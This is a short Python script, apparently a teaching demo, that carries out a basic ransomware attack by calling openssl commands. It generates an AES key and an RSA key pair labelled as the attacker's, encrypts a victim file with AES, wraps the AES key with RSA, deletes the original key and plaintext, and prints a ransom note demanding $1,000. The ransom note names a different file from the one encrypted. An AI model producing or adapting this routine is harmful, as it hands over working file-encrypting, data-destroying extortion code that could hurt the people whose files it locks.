import subprocess   # Allows us to run terminal commands inside Python
import os           # Allows us to delete files

# STEP 1: Generate a random 16-byte (128-bit) AES key using openssl rand
# Save the output in a file called key.txt
subprocess.run(["openssl", "rand", "-base64", "16"], stdout=open("key.txt", "w"))
print("[+] Generated AES key -> key.txt")

# STEP 2: Generate RSA private key (attacker’s private key)
# Save it as private.pem (2048-bit RSA key)
subprocess.run(["openssl", "genrsa", "-out", "private.pem", "2048"])
print("[+] Generated RSA private key -> private.pem")

# STEP 3: Extract the corresponding public key from the private key
# Save it as public.pem (this is what victim has access to)
subprocess.run(["openssl", "rsa", "-in", "private.pem", "-outform", "PEM", "-pubout", "-out", "public.pem"])
print("[+] Generated RSA public key -> public.pem")

# STEP 4: Encrypt the victim's secret file using the AES key (from key.txt)
# my_secrets.txt -> encrypted into data_cipher.txt
subprocess.run([
    "openssl", "enc", "-aes-128-cbc", "-base64",
    "-in", "my_secrets.txt", "-out", "data_cipher.txt",
    "-pass", "file:key.txt"
])
print("[+] Encrypted my_secrets.txt -> data_cipher.txt")

# STEP 5: Encrypt the AES key (key.txt) using RSA public key with pkeyutl
# Output is binary format -> key_cipher.bin
subprocess.run([
    "openssl", "pkeyutl", "-encrypt", "-pubin",
    "-inkey", "public.pem", "-in", "key.txt", "-out", "key_cipher.bin"
])
print("[+] Encrypted AES key with RSA -> key_cipher.bin")

# STEP 6: Convert key_cipher.bin into base64 format -> key_cipher.txt
subprocess.run(["base64", "key_cipher.bin"], stdout=open("key_cipher.txt", "w"))
print("[+] Converted encrypted AES key to base64 -> key_cipher.txt")

# STEP 7: Clean up temporary binary file
if os.path.exists("key_cipher.bin"):
    os.remove("key_cipher.bin")

# STEP 8: Delete the original AES key and victim's plaintext file
if os.path.exists("key.txt"):
    os.remove("key.txt")
if os.path.exists("my_secrets.txt"):
    os.remove("my_secrets.txt")
print("[+] Deleted key.txt and my_secrets.txt")

# STEP 9: Show ransom message to victim
print("\n💀 RANSOM NOTE 💀")
print("Your file important.txt is encrypted.")
print("To decrypt it, you need to pay me $1,000 and send key_cipher.txt to me.")
